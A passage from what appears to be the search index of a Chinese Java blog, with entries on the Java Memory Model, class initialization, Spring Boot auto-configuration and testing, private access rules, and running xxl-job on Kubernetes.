class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 参考 博客参考 ",
      "url"      : "http://localhost:4000/2018/06/24/LFU-LRU/"
    } ,
  
    {
      "title"    : "Java Memory Model",
      "category" : "JMM",
      "content": "JMM 虚拟机保证以下原子操作: lock(锁定): 作用于主内存变量, 标识为线程独有 unlock(解锁): 作用于主内存变量, 把变量释放 read(读取): 作用于主内存变量, 把变量传输到工作内存 load(载入): 作用于工作内存变量, 把read得到的变量放入到工作内存的变量副本 use(使用): 作用于工作内存变量, 把工作副本的变量传递给执行引擎 assign(赋值): 作用于工作内存变量, 把执行引擎的值赋值到工作内存 store(存储): 作用于工作内存, 把工作内存的值送到主内存中 write(写入): 作用于主内存, 把工作内存中得到的值放入主内存 happen-before 先行发生规则无需任何同步就能保障成立. 程序次序规则： 在一个线程内，按照程序代码顺序，书写在前面的操作先行发生于书写在后面的操作。 管程锁定规则： 一个unlock操作先行发生于后面对同一个锁的lock操作。 volatile变量规则 ：对一个volatile变量的写操作先行发生于后面对该变量的读操作。 线程启动规则： Thread对象的start()方法先行发生于此线程的每一个动作(即run()中的操作)。 线程终止规则： 线程中的所有操作都先行发生于对此线程的终止检查。我们可以通过Thread.join()方法结束，Thread.isAlive()返回值等手段检查到线程已经终止执行。 线程中断规则： 对线程interrupt()方法的调用先行发生于对此线程被中断线程的代码检测到中断事件的发生，可以通过Thread.interrupted(),Thread.isInterrupted()方法来检查到是否发生中断事件。 对象终结规则： 一个对象的初始化完成(构造函数执行完毕)先行发生于他的finalize()方法的开始。 传递性：  如果操作A先行发生于操作B，操作B先行发生于C， 那么就可以得到A先行发生于操作C。 参考 https://www.jianshu.com/p/bad25ea2abd9 ",
      "url"      : "http://localhost:4000/2018/07/01/JMM/"
    } ,
  
    {
      "title"    : "Java 类加载过程中的初始化",
      "category" : "类加载",
      "content": "Java类加载过程中的初始化 Java 类加载过程分为load，link（verify，prepare，resolve），initialising，use，unloading等。其中initialising阶段分为类初始化cinit和实例init的初始化。注意类初始化只会一次，实例初始化会多次。 类初始化 初始化时机 类初始化 ：就是类第一次加载到内存时进行的过程。类初始化只进行一次（前提是被同一类加载器加载），后续使用 new 等实例化对象时都不在进行初始化了，所以类初始化只运行一次。初始化的都是属于类（而不是实例）的内容（静态），所以对所有实例共享。 触发类初始化的时机是调用类的静态变量和方法。如何理解？ 我们知道具体触发点有： new 对象（对象的构造方法类似与静态方法） putStatic 写静态变量 getStatic 读静态变量 invokeStatic 调用静态方法 反射初始化对象 newInstance main方法中的类 初始化子类时，先初始化父类 jdk7 动态语言？ 初始化干了啥 在类初始化之前的准备阶段，虚拟机会将类变量（static 修饰的变量）分配内存并设置零值。 在类初始化阶段，执行类构造器 () 方法 收集所有类初始化代码和 static {} 域的代码，收集在一起成为 () 方法 子类初始化时会首先调用父类的 () 方法 JVM 会保证 () 方法的线程安全，保证同一时间只有一个线程执行 实例初始化 实例初始化 ：也就是实例化对象时每次都会进行的过程，初始化属于实例的内容（非静态），没有实例所拥有的实例内容是不共享的，独有的。 触发时机 new，反射初始化对象都会触发对象实例的初始化。和类的初始化有一部分重合，但是类初始化时实例不一定初始化。比如： MyClassLoader mcl = new MyClassLoader(); // Class&lt;?&gt; clazz = mcl.loadClass(People); // 类初始化 Class&lt;?&gt; clazz = Class.forName(People, true, mcl); // 类初始化 Object obj = clazz.newInstance(); //实例初始化 干了啥 JVM 收集实例初始化变量和 {} 域组合成实例初始化方法 实例初始化时首先执行 () 方法，然后执行构造函数 子类通过构造函数构造实例时会首先调用父类的 () 方法和父类的构造函数，如果没有显示调用父类的构造函数，那么 JVM 会自动调用父类的无参构造函数，保证父类构造函数一定被调用，然后再是子类自己的 () 方法和构造函数； ",
      "url"      : "http://localhost:4000/2018/07/14/java-initializing/"
    } ,
  
    {
      "title"    : "spring boot auto configuration and starter",
      "category" : "spring boot",
      "content": "spring boot auto configuration auto configure 创建configuration condition on class condition on missing bean new bean in spring context spring.factory loader 扫描resources/META-INF/spring.factories下的auto configure 例如spring-boot-autoconfigure:1.3.2.RELEASE上面目录下spring.factories文件如下 # Initializers org.springframework.context.ApplicationContextInitializer=   org.springframework.boot.autoconfigure.logging.AutoConfigurationReportLoggingInitializer Application Listeners org.springframework.context.ApplicationListener= org.springframework.boot.autoconfigure.BackgroundPreinitializer Auto Configure org.springframework.boot.autoconfigure.EnableAutoConfiguration= org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration, org.springframework.boot.autoconfigure.aop.AopAutoConfiguration, org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration, org.springframework.boot.autoconfigure.MessageSourceAutoConfiguration, org.springframework.boot.autoconfigure.PropertyPlaceholderAutoConfiguration, org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration, org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration, org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration, org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration, org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration, org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration, org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration, org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration, org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration, org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration, org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration, org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration, org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration, org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration, org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration, org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration, org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration, org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration, org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration, org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration, org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration, org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration, org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration, org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration, org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration, org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration, org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration, org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration, org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration, org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration, org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration, org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration, org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration, org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration, org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration, org.springframework.boot.autoconfigure.jms.hornetq.HornetQAutoConfiguration, org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration, org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration, org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration, org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration, org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration, org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration, org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration, org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration, org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration, org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration, org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration, org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration, org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration, org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration, org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration, org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration, org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration, org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration, org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration, org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration, org.springframework.boot.autoconfigure.session.SessionAutoConfiguration, org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration, org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration, org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration, org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration, org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration, org.springframework.boot.autoconfigure.velocity.VelocityAutoConfiguration, org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration, org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration, org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration, org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration, org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration, org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration, org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration, org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration, org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration, org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration, org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration, org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration, org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration Template availability providers org.springframework.boot.autoconfigure.template.TemplateAvailabilityProvider= org.springframework.boot.autoconfigure.freemarker.FreeMarkerTemplateAvailabilityProvider, org.springframework.boot.autoconfigure.mustache.MustacheTemplateAvailabilityProvider, org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAvailabilityProvider, org.springframework.boot.autoconfigure.thymeleaf.ThymeleafTemplateAvailabilityProvider, org.springframework.boot.autoconfigure.velocity.VelocityTemplateAvailabilityProvider, org.springframework.boot.autoconfigure.web.JspTemplateAvailabilityProvider enableXXX 也可以不通过spring factory loader，直接应用enableXXX ",
      "url"      : "http://localhost:4000/2018/07/16/spring-boot-starter/"
    } ,
  
    {
      "title"    : "private access level",
      "category" : "java",
      "content": "java中，除了类内部，什么情况下可以访问private变量？ package com.stone.javacore; public class PrivateAccess { public static class Line{ private double k; private double b; private boolean isVertical;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isVertical&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isVertical&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isVertical&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1.0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 原因JLS chapter on accessibility Otherwise, if the member or constructor is declared private, then access is permitted if and only if it occurs within the body of the top level class (§7.6) that encloses the declaration of the member or constructor. ",
      "url"      : "http://localhost:4000/2018/07/23/java-private-access/"
    } ,
  
    {
      "title"    : "xxl-job k8s实践",
      "category" : "xxl-job",
      "content": "xxl-job-admin 需要读取本地host文件作为集群身份 //取executor ip注册到admin StringBuffer triggerMsgSb = new StringBuffer(); triggerMsgSb.append(I18nUtil.getString(jobconf_trigger_admin_adress)).append(：).append(IpUtil.getIp());  t/**  t * get first valid addredd  t * @return  t */  tprivate static InetAddress getFirstValidAddress() {  t tInetAddress localAddress = null;  t ttry {  t t tlocalAddress = InetAddress.getLocalHost();  t t tif (isValidAddress(localAddress)) {  t t t treturn localAddress;  t t t}  t t} catch (Throwable e) {  t t tlogger.error(Failed to retriving ip address, + e.getMessage(), e);  t t}  ...  } executor job日志信息持久化，否则xxl-job-admin中无法查询读取 helm yaml配置文件中定义volumeMounts/volumeClaimTemplates executor 域名固定，否则服务重启后无法回调读取Job日志信息 定义headless service ",
      "url"      : "http://localhost:4000/2018/08/06/xxl-job-k8s/"
    } ,
  
    {
      "title"    : "How to do test in spring boot",
      "category" : "spring boot",
      "content": "How to do test in spring boot 引用 Integration test @RunWith(SpringRunner.class) @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) public class IntegrationTests { &lt;span class=&quot;nd&quot;&gt;@Autowired&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TestRestTemplate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;testRestTemplate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCar_WithName_ReturnsCar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;responseEntity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;testRestTemplate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getForEntity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/cars/{name}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;responseEntity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBody&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responseEntity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getStatusCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } controller @RunWith(SpringRunner.class) @WebMvcTest public class CarsControllerTests { &lt;span class=&quot;nd&quot;&gt;@Autowired&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MockMvc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mockMvc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@MockBean&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarService&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCar_WithName_ReturnsCar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;when&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;thenReturn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mockMvc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/cars/{name}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;andExpect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isOk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;andExpect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsonPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;andExpect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsonPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCar_NotFound_Returns404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;when&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;any&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;thenReturn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span 